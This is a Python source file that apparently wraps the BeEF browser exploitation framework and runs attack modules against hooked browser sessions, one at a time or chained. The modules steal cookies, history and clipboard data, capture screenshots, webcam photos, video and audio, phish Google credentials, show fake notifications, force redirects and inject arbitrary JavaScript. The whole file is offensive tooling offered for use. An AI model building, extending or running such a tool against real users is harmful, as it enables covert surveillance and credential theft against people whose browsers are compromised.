#!/usr/bin/env python3
"""
Attack Manager
Manages and coordinates all attack modules
"""
from attacks.info_gathering import (
    FingerprintAttack, GeolocationAttack, GetCookiesAttack,
    GetHistoryAttack, GetClipboardAttack, DetectSocialNetworksAttack
)
from attacks.media_capture import (
    ScreenshotAttack, WebcamPhotoAttack, WebcamRecordAttack,
    RecordAudioStartAttack, RecordAudioStopAttack
)
from attacks.social_engineering import (
    GooglePhishingAttack, PrettyTheftAttack, 
    FakeNotificationAttack, FakeNotification2Attack
)
from attacks.basic_attacks import (
    AlertAttack, Alert2Attack, RedirectAttack, RawJavaScriptAttack
)

class AttackManager:
    """Manages all available attack modules"""
    
    def __init__(self, beef_api):
        self.api = beef_api
        self.attacks = {}
        self._load_attacks()
    
    def _load_attacks(self):
        """Load all attack modules"""
        # Information Gathering
        self.attacks['fingerprint'] = FingerprintAttack(self.api)
        self.attacks['geolocation'] = GeolocationAttack(self.api)
        self.attacks['cookies'] = GetCookiesAttack(self.api)
        self.attacks['history'] = GetHistoryAttack(self.api)
        self.attacks['clipboard'] = GetClipboardAttack(self.api)
        self.attacks['detect_social'] = DetectSocialNetworksAttack(self.api)
        
        # Media Capture
        self.attacks['screenshot'] = ScreenshotAttack(self.api)
        self.attacks['webcam'] = WebcamPhotoAttack(self.api)
        self.attacks['webcam_record'] = WebcamRecordAttack(self.api)
        self.attacks['audio_start'] = RecordAudioStartAttack(self.api)
        self.attacks['audio_stop'] = RecordAudioStopAttack(self.api)
        
        # Social Engineering
        self.attacks['google_phish'] = GooglePhishingAttack(self.api)
        self.attacks['pretty_theft'] = PrettyTheftAttack(self.api)
        self.attacks['fake_notification'] = FakeNotificationAttack(self.api)
        self.attacks['fake_notification2'] = FakeNotification2Attack(self.api)
        
        # Basic Attacks
        self.attacks['alert'] = AlertAttack(self.api)
        self.attacks['alert2'] = Alert2Attack(self.api)
        self.attacks['redirect'] = RedirectAttack(self.api)
        self.attacks['javascript'] = RawJavaScriptAttack(self.api)
    
    def get_attack(self, attack_name):
        """Get attack module by name"""
        return self.attacks.get(attack_name)
    
    def list_attacks(self, category=None):
        """List all available attacks, optionally filtered by category"""
        if category:
            return {k: v for k, v in self.attacks.items() if v.category == category}
        return self.attacks
    
    def get_categories(self):
        """Get list of all attack categories"""
        categories = set()
        for attack in self.attacks.values():
            categories.add(attack.category)
        return sorted(list(categories))
    
    def execute_attack(self, attack_name, session_id, **kwargs):
        """Execute a single attack"""
        attack = self.get_attack(attack_name)
        if not attack:
            return False, f"Attack '{attack_name}' not found"
        
        return attack.execute(session_id, **kwargs)
    
    def execute_sequence(self, attack_names, session_id, **kwargs):
        """
        Execute multiple attacks in sequence
        
        Args:
            attack_names: List of attack names to execute
            session_id: Target session ID
            **kwargs: Parameters for attacks
            
        Returns:
            list: List of tuples (attack_name, success, result)
        """
        results = []
        
        for attack_name in attack_names:
            attack = self.get_attack(attack_name)
            if not attack:
                results.append((attack_name, False, f"Attack not found"))
                continue
            
            success, result = attack.execute(session_id, **kwargs)
            results.append((attack_name, success, result))
        
        return results
